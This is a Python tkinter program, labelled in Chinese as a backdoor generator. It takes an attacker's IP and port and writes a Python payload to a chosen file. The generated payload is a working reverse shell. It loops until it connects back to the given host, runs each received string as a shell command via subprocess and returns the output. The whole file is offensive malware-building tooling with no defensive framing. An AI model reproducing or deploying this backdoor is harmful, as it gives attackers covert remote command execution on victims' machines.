from tkinter import*
from tkinter import filedialog, dialog
import os
file_path = ''
file_text = ''
lhost = ''
bools = False

options = {}
options['defaultextension'] = ".py"
options['filetypes'] = (("Foo files", ".py"), ("Bar files", ".txt"), ("All files", "*"))
options['initialdir'] = ""
options['initialfile'] = ""
options['title'] = "Save as..."

def summon_python(lhost,lport):
    lports = str(lport)
    
    buf = 'import socket \n'
    buf += 'import subprocess \n'
    buf += 'while True: \n'
    buf += '    while True: \n'
    buf += '        try: \n'
    buf += '            sock=socket.socket() \n'
    buf += "            sock.connect(('"
    buf += lhost
    buf += "',"
    buf += lports
    buf += ')) \n'
    buf += '            break \n'
    buf += '        except: \n'
    buf += '            pass \n'
    buf += '    while True:  \n'
    buf += '        try: \n'
    buf += '            data = sock.recv(1024) \n'
    buf += "            da = data.decode('utf-8') \n"
    buf += "            fankui = subprocess.getoutput(da) \n"
    buf += "            sock.sendall(fankui.encode('utf-8')) \n"
    buf += "        except ConnectionResetError: \n"
    buf += "            break \n"
    return buf

def save():
    global file_path
    global file_text
    lhost = en.get()
    lport = en_1.get()
    #file_text = summon_python(lhost=lhost,lport=lport)
    
    file_path = filedialog.asksaveasfilename(**options)
    print('保存文件：', file_path)
    
def summon():
    global file_text
    global file_path
    lhost = en.get()
    lport = en_1.get()
    file_text = summon_python(lhost=lhost,lport=lport)

    if file_path is not None:
        with open(file_path,"a+") as f:
            f.write(file_text)
#---------------------------------------------------
tk = Tk()
tk.title('后门生成-python')
tk.geometry('300x150+420+200')
#----------------------------------------------------
en = Entry(tk)
en.place(x=80,y=20)
en_1 = Entry(tk)
en_1.place(x=80,y=50)

#--------------------------text------------------
w= Label(tk,text='你的IP:',fg="red")
w.place(x=20,y=20)
w_2= Label(tk,text='端口:',fg="red")
w_2.place(x=20,y=50)
#------------------------start or stop----------------
b = Button(tk, text ="选择路径", command=save)
b.place(x=20,y=80)
b_2 = Button(tk, text ="生成", command=summon)
b_2.place(x=200,y=80)
tk.mainloop()
